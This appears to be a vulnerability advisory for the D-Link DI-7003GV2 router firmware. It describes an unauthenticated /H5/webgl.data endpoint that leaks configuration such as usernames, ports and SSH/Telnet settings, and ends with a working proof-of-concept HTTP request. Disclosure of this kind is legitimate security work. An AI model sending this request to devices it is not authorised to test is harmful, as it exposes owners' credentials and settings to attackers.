# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 contains an information disclosure vulnerability in the `/H5/webgl.data` endpoint. This unauthenticated interface allows remote attackers to retrieve sensitive device configuration information, including HTTP ports, usernames, SSH and Telnet settings, remote management configurations, and more.
# Vulnerability details

The handling function for `H5/webgl.data` interface is `sub_41F0FC`.

![图 0](img/c24fb97b28b644441d3b9f4be7c9ae9e7ff83932fa9acdc90133f21fe4f7d409.png)  

`sub_41F0FC` function gets the parameter table from `off_682A00`, reads sensitive information from the device and returns it to the user.

![图 1](img/9697b246b3a2980f5ee5f20500aa4bae914839b071cc1629b59fb90aaa875a7e.png)  

![图 2](img/865a0b35c3d67a3cb6a6d7332719ae5c79fdad4e23d80c382f1aa8cce545de8c.png)  


# Poc

```http
GET /H5/webgl.data HTTP/1.1
Host: 192.168.140.240
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/relogin.htm?_312223&_t=41205959
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
If-Modified-Since: Tue, 27 Jun 2023 10:03:04 GMT
Connection: keep-alive
```

![图 3](img/4330e036bd7cf0e6ed8c7fa20796f1f8c292950556940ceb6c8b3c8264bd90c4.png)  
